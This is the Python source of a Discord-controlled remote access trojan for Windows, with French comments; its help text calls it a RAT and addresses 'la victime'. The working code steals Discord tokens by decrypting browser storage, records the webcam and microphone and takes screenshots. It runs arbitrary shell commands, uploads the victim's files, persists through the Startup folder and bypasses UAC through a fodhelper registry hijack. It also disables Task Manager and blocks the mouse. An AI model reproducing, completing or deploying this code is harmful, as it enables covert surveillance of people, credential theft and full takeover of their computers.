import subprocess
import sys
import discord
from discord.ext import commands
import platform
import socket
import psutil
import uuid
import shutil
import requests
import screeninfo
import getpass
import tempfile
import os
import pyautogui
import io
import webbrowser
import pyttsx3
import re
import base64
import json
import winreg
import pyaudio
import cv2
import time
import inspect
import ctypes
import wave
import tkinter as tk
import asyncio
import threading
from pathlib import Path
from PIL import Image
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL

def is_pythonw():
    return sys.executable.lower().endswith('pythonw.exe')

if not is_pythonw():
    print("Ce script doit être exécuté avec pythonw.exe pour fonctionner correctement.")

if sys.platform == "win32":
    import winreg as reg

pyautogui.FAILSAFE = False

mouse_blocked = False

TOKEN = ''

CHANNEL_ID = 

intents = discord.Intents.default()
intents.message_content = True  
bot = commands.Bot(command_prefix='+', intents=intents)

engine = pyttsx3.init()

@bot.event
async def on_ready():
    print(f'Bot connecté en tant que {bot.user}')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await channel.send(f"Commande non trouvée")
    else:
        await channel.send(f"Erreur de commande")

@bot.event
async def on_ready():
    user_name = getpass.getuser()

    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f"{user_name} est connecté !")
    else:
        print(f"Erreur : Impossible de trouver le canal avec l'ID {CHANNEL_ID}")

@bot.command(name='screenshot')
async def screenshot(ctx):
    try:
        await ctx.send("Commande reçue, prise du screenshot en cours...")

        screenshot = pyautogui.screenshot()
        await ctx.send("Capture d'écran réussie.")

        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        file = discord.File(fp=buffer, filename="screenshot.png")
        await ctx.send("Envoi de l'image en cours...")
        await ctx.send(file=file)
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue : {str(e)}")

@bot.command(name='open_url')
async def open_url(ctx, url: str):
    try:
        if not url.startswith(('http://', 'https://')):
            await ctx.send("L'URL doit commencer par 'http://' ou 'https://'.")
            return
        
        webbrowser.open(url)
        await ctx.send(f"L'URL {url} a été ouverte dans le navigateur.")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'ouverture de l'URL : {str(e)}")

@bot.command(name='system_info')
async def system_info(ctx):
    try:
        user_name = getpass.getuser()
        computer_name = platform.node()
        display_name = os.getlogin()

        system_name = platform.system()
        system_version = platform.version()
        cpu_info = platform.processor()
        ram_info = f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)}Go"
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

        gpu_info = "Non disponible sous Python natif sans modules spécifiques"

        public_ip = requests.get('https://api64.ipify.org?format=json').json()["ip"]
        local_ip = socket.gethostbyname(socket.gethostname())
        
        ipv6_addresses = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET6:
                    ipv6_addresses.append(addr.address)

        ipv6 = ipv6_addresses if ipv6_addresses else ["None"]

        ip_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
        isp = ip_info.get('org', 'Inconnu')
        as_info = ip_info.get('asn', {}).get('name', 'Inconnu')
        location = ip_info.get('city', 'Inconnu'), ip_info.get('region', 'Inconnu'), ip_info.get('country', 'Inconnu')
        
        disk_info = ""
        partitions = psutil.disk_partitions()
        for partition in partitions:
            partition_usage = psutil.disk_usage(partition.mountpoint)
            disk_info += f"{partition.device} | {round(partition_usage.free / (1024 ** 3), 2)}Go | {round(partition_usage.total / (1024 ** 3), 2)}Go | {round(partition_usage.percent, 2)}% | {partition.mountpoint}\n"

        screens = screeninfo.get_monitors()
        screen_info = ""
        for screen in screens:
            screen_info += f"Name : {screen.name}, Resolution : {screen.width}x{screen.height}, Main Screen : {'Yes' if screen.is_primary else 'No'}\n"
        
        location_info = requests.get(f'https://ipinfo.io/{public_ip}/json').json()
        country = location_info.get("country", "Inconnu")
        region = location_info.get("region", "Inconnu")
        city = location_info.get("city", "Inconnu")
        zip_code = location_info.get("postal", "Inconnu")
        timezone = location_info.get("timezone", "Inconnu")
        loc = location_info.get("loc", "0,0").split(',')

        response = f"""
System Info {user_name} "{public_ip}":
:bust_in_silhouette: | User Pc:
Name        : "{computer_name}"
Username    : "{user_name}"
DisplayName : "{display_name}"
:computer: | System:
Platform    : "{system_name}"
Version     : "{system_version}"
HWID        : "{uuid.uuid1()}"
MAC         : "{mac_address}"
CPU         : "{cpu_info}"
GPU         : "{gpu_info}"
RAM         : "{ram_info}"
:satellite: | Ip:
Public      : "{public_ip}"
Local       : "{local_ip}"
Ipv6        : "{', '.join(ipv6)}"
Isp         : "{isp}"
Org         : "{as_info}"
:minidisc: | Disk:
{disk_info}
:desktop: | Screen:
{screen_info}
:map: | Location:
Country     : "{country} ({ip_info.get('country')})"
Region      : "{region}"
City        : "{city}"
Zip         : "{zip_code}"
Timezone    : "{timezone}"
Latitude    : "{loc[0]}"
Longitude   : "{loc[1]}"
        """
        
        await ctx.send(response)
    
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la récupération des informations système : {str(e)}")

@bot.command(name='open_calculator')
async def open_calculator(ctx, number: int):
    try:
        if number <= 0:
            await ctx.send("Le nombre doit être un entier positif supérieur à zéro.")
            return
        
        for _ in range(number):
            subprocess.Popen('calc')

        await ctx.send(f"La calculatrice a été ouverte {number} fois.")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'ouverture de la calculatrice : {str(e)}")

@bot.command(name='voice')
async def voice(ctx, *, text: str):
    try:
        engine.setProperty('rate', 150)
        engine.setProperty('volume', 1)
        
        engine.say(text)
        engine.runAndWait()

        await ctx.send(f"Texte parlé : {text}")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la lecture du texte : {str(e)}")

def get_discord_tokens():
    tokens = set()  
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
    }
    
    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    
    def get_master_key(path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
    
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            full_path = os.path.join(path, file_name)
            if not file_name.endswith(('.log', '.ldb')):
                continue
            try:
                with open(full_path, 'r', errors='ignore') as file:
                    for line in file.readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line.strip()):
                            tokens.add(token)
                        for enc_token in re.findall(r"dQw4w9WgXcQ:[^\"]*", line.strip()):
                            try:
                                token = decrypt_val(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), get_master_key(os.path.join(roaming, platform, "Local State")))
                                tokens.add(token)
                            except:
                                continue
            except FileNotFoundError:
                continue
            except Exception as e:
                print(f"Erreur lors du traitement du fichier {file_name} dans {platform}: {e}")
    
    return list(tokens)  

@bot.command(name='steal_tokens')
async def steal_tokens(ctx):
    tokens = get_discord_tokens()
    if tokens:
        await ctx.send(f"Tokens trouvés: {tokens}")
    else:
        await ctx.send("Aucun token trouvé.")

bot.remove_command('help')

@bot.command(name='helps')
async def help_command(ctx):
    help_text = """
**Commandes disponibles :**

1. **+rat_help** - Affiche cette aide..
2. **+screenshot** - Prend une capture d'écran et l'envoie dans le canal.
3. **+open_url <url>** - Ouvre l'URL spécifiée dans le navigateur par défaut.
4. **+system_info** - Affiche les informations système de la machine de la victime.
5. **+open_calculator <number>** - Ouvre la calculatrice Windows le nombre de fois spécifié.
6. **+voice <texte>** - Convertit le texte en parole et le prononce.
7. **+steal_tokens** - Récupère les tokens Discord présents sur la machine.
8. **+shutdown** - éteind le pc
9. **+restart** - redémarre le pc
10. **+message <type> <message>** affiche un message sur l'écran de la victime.
11. **+<color> screen** met une couleur sur l'écran.
12. **+cmd <commande>** execute une commande sur le pc de la victime.
13. **+list_app** envoie un fichier contenant une liste de toutes les applications présentes sur le pc de la victime.
14. **+webcam <temps>** prend une capture vidéo de la webcam avec le temps souhaité (en secondes).
15. **+clear** permet de clear le canal pour alleger l'écran.
16. **+install** télécharge un fichier sur le pc de la victime.
17. **+block_mouse** permet de bloquer la souris.
18. **+unblock_mouse** permet de débloquer la souris.
19. **+play_s** permet de jouer un son sur l'ordinateur de la victime.
20. **+play_v** permet de jouer une vidéo (avec son) sur l'ordinateur de la victime.
21. **+startup** permet de mettre le RAT dans les éléments de démarage.
22. **+block_taskmanager** permet de désactiver le gestionnaire des tâches. (BUG)
23. **+unblock_taskmanager** permet de réactiver le gestionnaire des tâches. (BUG)
24. **+volumemax** permet de mettre le volume au maximum.
25. **+volumemin** permet de mettre le volume au minimum.
26. **+list_folder** permet de lister tous les dossiers présents sur le pc de la victime.
27. **+list_file <path/to/folder>** permet de lister tous les fichiers présents dans un dossier sur le pc de la victime.
28. **+upload <path/to/file>** permet de télécharger un fichier présent sur le pc de la victime.
29. **+logout** permet de déconnecter l'utilisateur du pc de la victime.
30. **+wallpaper (fichier joint)** permet de changer le fond d'écran.
31. **+geolocate** permet de géolocaliser l'ordinateur de la victime.

*N'hésitez pas à utiliser les commandes ci-dessus pour interagir avec le RAT.*
"""
    await ctx.send(help_text)

@bot.command(name='shutdown')
async def shutdown(ctx):
    try:
        await ctx.send("Arrêt du PC en cours...")
        subprocess.run("shutdown /s /t 1", shell=True)
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'arrêt du PC : {str(e)}")

@bot.command(name='restart')
async def restart(ctx):
    try:
        await ctx.send("Redémarrage du PC en cours...")
        subprocess.run("shutdown /r /t 1", shell=True)
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors du redémarrage du PC : {str(e)}")

@bot.command(name='message')
async def display_message(ctx, msg_type: str, *, message: str):
    try:
        title = ""
        if msg_type.lower() == 'error':
            title = "Erreur"
        elif msg_type.lower() == 'warning':
            title = "Avertissement"
        elif msg_type.lower() == 'info':
            title = "Information"
        else:
            title = "Message"

        pyautogui.alert(text=message, title=title, button='OK')
        await ctx.send(f"Message affiché : {msg_type} - {message}")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'affichage du message : {str(e)}")

@bot.command(name='color_screen')
async def color_screen(ctx, color: str):
    try:
        color = color.lower()
        hex_color = color if color.startswith('#') else f"#{color}"
        
        root = pyautogui.getWindow('root')  
        root.fill(hex_color)

        root.geometry("+0+0")
        root.attributes("-fullscreen", True)
        root.mainloop()

        await ctx.send(f"L'écran a été rempli avec la couleur : {color}")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'application de la couleur : {str(e)}")

@bot.command(name='cmd')
async def execute_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else "Commande exécutée avec succès, mais aucune sortie."
        error = result.stderr if result.stderr else None
        
        if error:
            await ctx.send(f":x: Erreur : {error}")
        else:
            for i in range(0, len(output), 2000):
                await ctx.send(f"```{output[i:i+2000]}```")
        
    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de l'exécution de la commande : {str(e)}")

@bot.command(name='list_app')
async def list_applications(ctx):
    try:
        apps = []
        registry_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]

        for registry_path in registry_paths:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    app_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    apps.append(app_name)
                except FileNotFoundError:
                    continue

        if apps:
            with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix=".txt") as temp_file:
                apps_list = "\n".join(sorted(apps))
                temp_file.write(apps_list)
                temp_file_path = temp_file.name

            with open(temp_file_path, 'rb') as file:
                await ctx.send("Voici la liste des applications installées :", file=discord.File(file, "applications.txt"))

            os.remove(temp_file_path)
        else:
            await ctx.send("Aucune application trouvée.")

    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la récupération des applications : {str(e)}")

@bot.command(name='webcam')
async def capture_webcam(ctx, duration: int):
    try:
        if duration <= 0:
            await ctx.send("La durée doit être un nombre positif.")
            return

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("Impossible d'accéder à la webcam.")
            return

        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp4') as temp_file:
            temp_file_path = temp_file.name
            out = cv2.VideoWriter(temp_file_path, fourcc, 20.0, (int(cap.get(3)), int(cap.get(4))))

            frame_count = 0
            max_frames = duration * 20  

            while frame_count < max_frames:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
                frame_count += 1

            cap.release()
            out.release()

        if os.path.getsize(temp_file_path) > 0:
            with open(temp_file_path, 'rb') as file:
                await ctx.send("Voici la vidéo capturée :", file=discord.File(file, "capture.mp4"))
        else:
            await ctx.send("Erreur lors de la capture vidéo : fichier vidéo vide.")

        os.remove(temp_file_path)

    except Exception as e:
        await ctx.send(f"Une erreur est survenue lors de la capture vidéo : {str(e)}")

@bot.command(name='clear')
@commands.has_permissions(manage_messages=True)
async def clear_channel(ctx):
    try:
        await ctx.channel.purge()

    except Exception as e:
        print(f"Erreur lors de la suppression des messages : {str(e)}")

@bot.command(name='install')
async def install(ctx):
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(os.getcwd(), attachment.filename)
        
        await attachment.save(file_path)
        await ctx.send(f'Fichier {attachment.filename} téléchargé avec succès.')
    else:
        await ctx.send('Aucun fichier attaché. Veuillez joindre un fichier à votre message.')

@bot.command(name='block_mouse')
async def block_mouse(ctx):
    global mouse_blocked
    if not mouse_blocked:
        mouse_blocked = True
        await ctx.send('La souris est maintenant bloquée.')
        
        def block():
            while mouse_blocked:
                pyautogui.moveTo(0, 0)
                time.sleep(0.1)

        threading.Thread(target=block, daemon=True).start()
    else:
        await ctx.send('La souris est déjà bloquée.')

@bot.command(name='unblock_mouse')
async def unblock_mouse(ctx):
    global mouse_blocked
    if mouse_blocked:
        mouse_blocked = False
        await ctx.send('La souris est maintenant débloquée.')
    else:
        await ctx.send('La souris n\'est pas bloquée.')

@bot.command()
async def play_v(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Veuillez joindre un fichier vidéo.")
        return

    attachment = ctx.message.attachments[0]
    filename = attachment.filename

    if not filename.endswith(('.mp4', '.mkv', '.avi', '.mov', '.flv')):
        await ctx.send("Le fichier joint n'est pas un format vidéo supporté.")
        return

    file_path = f"./{filename}"
    await attachment.save(file_path)

    vlc_path = "C:/Program Files/VideoLAN/VLC/vlc.exe" 

    try:
        subprocess.run([vlc_path, file_path], check=True) 
        await ctx.send(f"Lecture de la vidéo : {filename}")
    except subprocess.CalledProcessError as e:
        await ctx.send("Erreur lors de la tentative de lecture de la vidéo.")
        print(e)
    except FileNotFoundError:
        await ctx.send("Le lecteur vidéo spécifié est introuvable. Vérifiez le chemin.")

    os.remove(file_path)

@bot.command()
async def play_s(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Veuillez joindre un fichier vidéo.")
        return

    attachment = ctx.message.attachments[0]
    filename = attachment.filename

    if not filename.endswith(('.mp4', '.mkv', '.avi', '.mov', '.flv')):
        await ctx.send("Le fichier joint n'est pas un format vidéo supporté.")
        return

    file_path = f"./{filename}"
    await attachment.save(file_path)

    vlc_path = "C:/Program Files/VideoLAN/VLC/vlc.exe"

    try:
        subprocess.run([vlc_path, "--intf", "dummy", "--play-and-exit", "--no-video", file_path], check=True)
        await ctx.send(f"Lecture de l'audio de la vidéo : {filename}")
    except subprocess.CalledProcessError as e:
        await ctx.send("Erreur lors de la tentative de lecture de l'audio.")
        print(e)
    except FileNotFoundError:
        await ctx.send("Le lecteur audio spécifié est introuvable. Vérifiez le chemin.")

    os.remove(file_path)

@bot.command()
async def record(ctx, time: int):
    if time <= 0:
        await ctx.send("Veuillez spécifier un temps d'enregistrement positif.")
        return

    file_path = "output.wav"
    chunk = 1024  
    format = pyaudio.paInt16  
    channels = 1  
    rate = 44100 

    p = pyaudio.PyAudio()

    try:
        stream = p.open(format=format,
                        channels=channels,
                        rate=rate,
                        input=True,
                        frames_per_buffer=chunk)
    except OSError as e:
        await ctx.send(f"Erreur lors de l'ouverture du flux audio : {e}")
        p.terminate()
        return

    await ctx.send(f"Enregistrement de {time} secondes...")

    frames = []

    for _ in range(0, int(rate / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(file_path, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    with open(file_path, 'rb') as f:
        await ctx.send("Voici l'enregistrement :", file=discord.File(f, file_path))

    os.remove(file_path)

@bot.command()
async def startup(ctx):
    if sys.platform == "win32":
        try:
            # Chemin du script du bot
            bot_script = os.path.abspath(sys.argv[0])

            # Chemin du dossier Startup
            startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
            
            # Nom du raccourci
            shortcut_path = startup_folder / "DiscordBotStartup.lnk"
            
            # Création du raccourci
            import pythoncom
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.TargetPath = bot_script
            shortcut.WorkingDirectory = os.path.dirname(bot_script)
            shortcut.IconLocation = bot_script
            shortcut.save()
            
            await ctx.send("Le bot a été ajouté au démarrage automatique du système.")
        except Exception as e:
            await ctx.send(f"Erreur lors de l'ajout au démarrage : {e}")
    else:
        await ctx.send("Cette commande fonctionne uniquement sur Windows.")

def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

# Classe pour contourner la redirection du système de fichiers 64 bits
class disable_fsr:
    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self.disable(ctypes.byref(self.old_value))
    def __exit__(self, type, value, traceback):
        if self.success:
            self.revert(self.old_value)

# Fonction générique pour bypass UAC et exécuter une commande avec élévation des privilèges
async def bypass_uac(ctx, command):
    if isAdmin():
        os.system(command)
    else:
        await ctx.send("Tentative d'obtention des droits administratifs...")

        isexe = sys.argv[0].endswith("exe")
        current_dir = inspect.getframeinfo(inspect.currentframe()).filename
        cmd2 = current_dir if not isexe else sys.argv[0]

        create_reg_path = r"""powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force"""
        os.system(create_reg_path)

        create_trigger_reg_key = r"""powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force"""
        os.system(create_trigger_reg_key)

        if not isexe:
            create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python \"{cmd2}\"' -Force"""
        else:
            create_payload_reg_key = f"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start \"{cmd2}\"' -Force"""
        os.system(create_payload_reg_key)

        with disable_fsr():
            os.system("fodhelper.exe")

        # Attendre un peu pour s'assurer que l'élévation s'est produite
        time.sleep(2)

        # Vérification après élévation
        if isAdmin():
            await ctx.send("Élévation réussie, exécution de la commande...")
            os.system(command)
        else:
            await ctx.send("Échec de l'obtention des droits administratifs.")

        # Nettoyage des entrées de registre
        remove_reg = r"""powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force"""
        os.system(remove_reg)

@bot.command()
async def uacbypass(ctx):
    await bypass_uac(ctx, "echo 'Bypass réussi!'")

@bot.command()
async def block_taskmanager(ctx):
    block_cmd = r"""powershell New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value 1 -Force"""
    await bypass_uac(ctx, block_cmd)
    await ctx.send("Le gestionnaire des tâches a été désactivé.")

@bot.command()
async def unblock_taskmanager(ctx):
    unblock_cmd = r"""powershell Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Force"""
    await bypass_uac(ctx, unblock_cmd)
    await ctx.send("Le gestionnaire des tâches a été réactivé.")

def set_volume(volume_level):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = interface.QueryInterface(IAudioEndpointVolume)
    volume.SetMasterVolumeLevelScalar(volume_level, None)

@bot.command(name='volumemax')
async def volumemax(ctx):
    set_volume(1.0)  # Met le volume à 100%
    await ctx.send("🔊 Volume mis au maximum.")

@bot.command(name='volumemin')
async def volumemin(ctx):
    set_volume(0.0)  # Met le volume à 0%
    await ctx.send("🔈 Volume mis au minimum.")

@bot.command(name='list_folder')
async def list_folder(ctx):
    root_dir = 'C:\\'  # Spécifiez le répertoire de départ, changez-le selon votre OS
    output_file = 'folder_list.txt'

    try:
        with open(output_file, 'w', encoding='utf-8') as file:  # Utilisation de l'encodage UTF-8
            for root, dirs, _ in os.walk(root_dir):
                for dir_name in dirs:
                    file.write(os.path.join(root, dir_name) + '\n')

        await ctx.send(file=discord.File(output_file))

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")

@bot.command(name='list_file')
async def list_file(ctx, directory: str):
    output_file = 'file_list.txt'

    try:
        if not os.path.isdir(directory):
            await ctx.send(f"Le chemin spécifié n'est pas un dossier valide : {directory}")
            return

        with open(output_file, 'w', encoding='utf-8') as file:
            for root, _, files in os.walk(directory):
                for file_name in files:
                    file.write(os.path.join(root, file_name) + '\n')

        await ctx.send(file=discord.File(output_file))

        # Supprimer le fichier après l'envoi
        os.remove(output_file)

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")

@bot.command(name='upload')
async def upload(ctx, file_path: str):
    try:
        if not os.path.isfile(file_path):
            await ctx.send(f"Le chemin spécifié n'est pas un fichier valide : {file_path}")
            return

        await ctx.send(file=discord.File(file_path))

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite lors de l'envoi du fichier : {e}")

@bot.command(name='wallpaper')
async def wallpaper(ctx):
    if not ctx.message.attachments:
        await ctx.send("Veuillez joindre une image pour définir comme fond d'écran.")
        return
    
    attachment = ctx.message.attachments[0]
    file_path = os.path.join(os.getcwd(), attachment.filename)
    
    try:
        # Télécharger l'image envoyée
        await attachment.save(file_path)

        # Définir l'image comme fond d'écran
        ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 0)
        await ctx.send("L'image a été définie comme fond d'écran.")
        
    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")
    
    finally:
        # Supprimer l'image téléchargée après l'avoir utilisée
        if os.path.isfile(file_path):
            os.remove(file_path)

@bot.command(name='logout')
async def logout(ctx):
    try:
        os_type = platform.system()

        if os_type == "Windows":
            # Commande pour déconnecter l'utilisateur sous Windows
            os.system("shutdown /l")
        elif os_type == "Linux" or os_type == "Darwin":
            # Commande pour déconnecter l'utilisateur sous Linux ou MacOS
            os.system("gnome-session-quit --logout --no-prompt")
            # Sur MacOS, une autre option peut être utilisée si nécessaire
            # os.system("osascript -e 'tell application \"System Events\" to log out'")
        else:
            await ctx.send(f"Système d'exploitation non supporté : {os_type}")
            return
        
        await ctx.send("Déconnexion en cours...")
        
    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")

@bot.command(name='geolocate')
async def geolocate(ctx):
    try:
        # Utilisation du service ipinfo.io pour la géolocalisation
        response = requests.get("https://ipinfo.io")
        data = response.json()
        
        # Extraire les coordonnées
        location = data.get("loc", None)
        
        if location:
            latitude, longitude = location.split(',')
            await ctx.send(f"📍 Localisation actuelle:\nLatitude: {latitude}\nLongitude: {longitude}")
        else:
            await ctx.send("Impossible de déterminer la localisation.")

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")

bot.remove_command('geolocate')

@bot.command(name='geolocate')
async def geolocate(ctx):
    try:
        # Utilisation du service ipinfo.io pour la géolocalisation
        response = requests.get("https://ipinfo.io")
        data = response.json()
        
        # Extraire les coordonnées
        location = data.get("loc", None)
        
        if location:
            latitude, longitude = location.split(',')
            await ctx.send(f"📍 Localisation actuelle:\nLatitude: {latitude}\nLongitude: {longitude}")
        else:
            await ctx.send("Impossible de déterminer la localisation.")

    except Exception as e:
        await ctx.send(f"Une erreur s'est produite : {e}")

async def main():
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())